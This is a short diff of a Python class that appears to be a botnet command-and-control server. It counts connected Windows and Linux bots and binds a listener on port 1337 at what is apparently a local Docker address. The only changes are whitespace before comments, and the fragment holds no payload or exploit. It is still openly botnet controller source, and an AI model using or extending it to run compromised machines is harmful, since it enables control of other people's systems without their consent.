@@ -31,7 +31,7 @@ class BotnetCmdCtrl:
 		self.windows_count = 0 # Count for the number of Windows machines connected to our botnet.
 		self.linux_count = 0 # Count for the number of Linux machines connected to our botnet.
 		self.windows_connections = {} # Dict containing Windows machines IP addresses and corresponding socket object.
-		self.linux_connections = {}	# Dict containing Linux machines IP addresses and corresponding socket object.
+		self.linux_connections = {} # Dict containing Linux machines IP addresses and corresponding socket object.
 		self.server_socket = None # Will store the socket object created for the server.
 		
 	def create_server_socket(self):
@@ -45,7 +45,7 @@ class BotnetCmdCtrl:
 				None			
 		"""
 		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-			PORT = 1337	# Port number to receve connection from.
+			PORT = 1337 # Port number to receve connection from.
 			IP = "172.17.0.1" # IP address of server.
 			sock.bind((IP, PORT)) # Bind the IP and port to a network interface card.
 			sock.listen(10)	# Listen for incoming connections, default is 10, increase for more connections.
